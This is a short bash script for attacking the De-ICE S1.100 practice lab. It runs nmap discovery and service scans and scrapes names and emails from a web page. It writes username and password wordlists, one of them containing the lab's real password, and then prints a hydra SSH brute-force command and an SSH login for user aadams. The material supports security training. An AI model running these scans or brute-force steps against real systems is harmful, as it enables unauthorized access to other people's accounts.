#!/bin/bash

# De-ICE S1.100 Reconnaissance Script
echo "=== De-ICE S1.100 Reconnaissance ==="
echo "Target: target-web (192.168.100.0/24 network)"
echo ""

echo "[+] Step 1: Network Discovery"
echo "nmap -sn 192.168.100.0/24"
nmap -sn 192.168.100.0/24
echo ""

echo "[+] Step 2: Port Scanning target-web"
echo "nmap -sC -sV target-web"
nmap -sC -sV target-web
echo ""

echo "[+] Step 3: Web Enumeration"
echo "curl -s http://target-web | grep -E '(Name|Email)'"
curl -s http://target-web | grep -E '(Name|Email)'
echo ""

echo "[+] Step 4: Generate Username List"
cat > /root/lab/users.txt << 'EOF'
aadams
bbanter  
ccoffee
ddeeds
eeikman
root
admin
EOF
echo "Created users.txt with potential usernames"

echo "[+] Step 5: Generate Password List"
cat > /root/lab/passwords.txt << 'EOF'
nostaw
password
password123
123456
admin
root
EOF
echo "Created passwords.txt with common weak passwords"

echo ""
echo "=== Ready for Exploitation ==="
echo "Next steps:"
echo "1. FTP enumeration: ftp target-ftp"
echo "2. SSH brute force: hydra -L users.txt -P passwords.txt target-ssh ssh -s 2222"
echo "3. SSH access: ssh -p 2222 aadams@target-ssh (password: nostaw)"